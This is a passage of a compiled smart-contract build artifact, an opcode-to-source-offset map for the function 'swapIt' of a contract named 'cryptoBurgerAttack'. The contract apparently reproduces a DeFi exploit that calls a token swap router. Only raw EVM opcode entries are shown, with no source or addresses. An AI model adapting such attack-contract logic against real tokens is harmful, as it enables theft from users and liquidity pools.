      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10827": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10829": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10830": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10831": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10832": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "SUB",
      "path": "0"
    },
    "10833": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10834": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10836": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP8",
      "path": "0"
    },
    "10837": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "GAS",
      "path": "0"
    },
    "10838": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "CALL",
      "path": "0"
    },
    "10839": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10840": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10841": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10842": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2A67"
    },
    "10845": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10846": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10847": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10849": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10850": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "10851": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10852": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10854": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10855": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10856": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "POP",
      "path": "0"
    },
    "10857": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "POP",
      "path": "0"
    },
    "10858": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "POP",
      "path": "0"
    },
    "10859": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "POP",
      "path": "0"
    },
    "10860": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10862": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10863": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10864": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10866": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "NOT",
      "path": "0"
    },
    "10867": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10869": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10870": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "ADD",
      "path": "0"
    },
    "10871": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "AND",
      "path": "0"
    },
    "10872": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10873": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "ADD",
      "path": "0"
    },
    "10874": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10875": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10877": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10878": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "POP",
      "path": "0"
    },
    "10879": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10880": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "ADD",
      "path": "0"
    },
    "10881": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10882": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2A8B"
    },
    "10885": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10886": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10887": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2EAC"
    },
    "10890": {
      "fn": "cryptoBurgerAttack.swapIt",
      "jump": "i",
      "offset": [
        12376,
        12431
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10891": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10892": {
      "op": "POP"
    },
    "10893": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 100,
      "value": "0x40"
    },
    "10895": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10896": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10897": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12494,
        12495
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "10899": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10900": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10901": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10902": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12442,
        12463
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "10904": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10905": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10906": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "ADD",
      "path": "0"
    },
    "10907": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP5",
      "path": "0"
    },
    "10908": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10909": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12442,
        12463
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "10910": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10912": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10913": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "ADD",
      "path": "0"
    },
    "10914": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10915": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10916": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "10917": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10918": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "CALLDATACOPY",
      "path": "0"
    },
    "10919": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "ADD",
      "path": "0"
    },
    "10920": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10921": {
      "op": "POP"
    },
    "10922": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12480,
        12496
      ],
      "op": "POP",
      "path": "0"
    },
    "10923": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12473,
        12496
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10924": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12473,
        12496
      ],
      "op": "POP",
      "path": "0"
    },
    "10925": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12517,
        12525
      ],
      "op": "DUP6",
      "path": "0",
      "statement": 101
    },
    "10926": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12511
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10927": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12512,
        12513
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10929": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10930": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10931": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10932": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "LT",
      "path": "0"
    },
    "10933": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2AC0"
    },
    "10936": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10937": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2AC0"
    },
    "10940": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "10943": {
      "fn": "cryptoBurgerAttack.swapIt",
      "jump": "i",
      "offset": [
        12507,
        12514
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10944": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10945": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10947": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "MUL",
      "path": "0"
    },
    "10948": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10950": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "ADD",
      "path": "0"
    },
    "10951": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12514
      ],
      "op": "ADD",
      "path": "0"
    },
    "10952": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10953": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10955": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10957": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10959": {
      "op": "SHL"
    },
    "10960": {
      "op": "SUB"
    },
    "10961": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "AND",
      "path": "0"
    },
    "10962": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10963": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10964": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10966": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10968": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10970": {
      "op": "SHL"
    },
    "10971": {
      "op": "SUB"
    },
    "10972": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "AND",
      "path": "0"
    },
    "10973": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10974": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10975": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "POP",
      "path": "0"
    },
    "10976": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12507,
        12525
      ],
      "op": "POP",
      "path": "0"
    },
    "10977": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12545,
        12554
      ],
      "op": "DUP5",
      "path": "0",
      "statement": 102
    },
    "10978": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12539
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10979": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12540,
        12541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "10981": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10982": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10983": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10984": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "LT",
      "path": "0"
    },
    "10985": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2AF4"
    },
    "10988": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10989": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2AF4"
    },
    "10992": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "10995": {
      "fn": "cryptoBurgerAttack.swapIt",
      "jump": "i",
      "offset": [
        12535,
        12542
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10996": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10997": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10999": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11001": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "11003": {
      "op": "SHL"
    },
    "11004": {
      "op": "SUB"
    },
    "11005": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12554
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11006": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12554
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "11007": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12554
      ],
      "op": "AND",
      "path": "0"
    },
    "11008": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "11010": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "11011": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "DUP4",
      "path": "0"
    },
    "11012": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "MUL",
      "path": "0"
    },
    "11013": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "11014": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11015": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "11016": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "ADD",
      "path": "0"
    },
    "11017": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11018": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "11019": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12542
      ],
      "op": "ADD",
      "path": "0"
    },
    "11020": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12535,
        12554
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "11021": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 103,
      "value": "0x40"
    },
    "11023": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "11024": {
      "op": "PUSH4",
      "value": "0x5C11D795"
    },
    "11029": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "11031": {
      "op": "SHL"
    },
    "11032": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP2",
      "path": "0"
    },
    "11033": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "11034": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11036": {
      "op": "DUP1"
    },
    "11037": {
      "op": "MLOAD"
    },
    "11038": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11040": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "11043": {
      "op": "DUP4"
    },
    "11044": {
      "op": "CODECOPY"
    },
    "11045": {
      "op": "DUP2"
    },
    "11046": {
      "op": "MLOAD"
    },
    "11047": {
      "op": "SWAP2"
    },
    "11048": {
      "op": "MSTORE"
    },
    "11049": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11050": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12669
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x5C11D795"
    },
    "11055": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12669
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11056": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2B45"
    },
    "11059": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11060": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12687,
        12695
      ],
      "op": "DUP8",
      "path": "0"
    },
    "11061": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12687,
        12695
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11062": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12713,
        12722
      ],
      "op": "DUP8",
      "path": "0"
    },
    "11063": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12713,
        12722
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11064": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12740,
        12744
      ],
      "op": "DUP7",
      "path": "0"
    },
    "11065": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12740,
        12744
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11066": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12762,
        12765
      ],
      "op": "DUP9",
      "path": "0"
    },
    "11067": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12762,
        12765
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11068": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12783,
        12798
      ],
      "op": "TIMESTAMP",
      "path": "0"
    },
    "11069": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12783,
        12798
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "11070": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "11072": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "ADD",
      "path": "0"
    },
    "11073": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2F41"
    },
    "11076": {
      "fn": "cryptoBurgerAttack.swapIt",
      "jump": "i",
      "offset": [
        12565,
        12812
      ],
      "op": "JUMP",
      "path": "0"
    },
    "11077": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "11078": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "11080": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "11082": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "11083": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP1",
      "path": "0"
    },
    "11084": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP4",
      "path": "0"
    },
    "11085": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "SUB",
      "path": "0"
    },
    "11086": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP2",
      "path": "0"
    },
    "11087": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "11089": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP8",
      "path": "0"
    },
    "11090": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP1",
      "path": "0"
    },
    "11091": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "11092": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "11093": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP1",
      "path": "0"
    },
    "11094": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "11095": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2B5F"
    },
    "11098": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "11099": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "11101": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP1",
      "path": "0"
    },
    "11102": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "REVERT",
      "path": "0"
    },
    "11103": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "11104": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "POP",
      "path": "0"
    },
    "11105": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "GAS",
      "path": "0"
    },
    "11106": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "CALL",
      "path": "0"
    },
    "11107": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "11108": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP1",
      "path": "0"
    },
    "11109": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "11110": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2B73"
    },
    "11113": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "11114": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
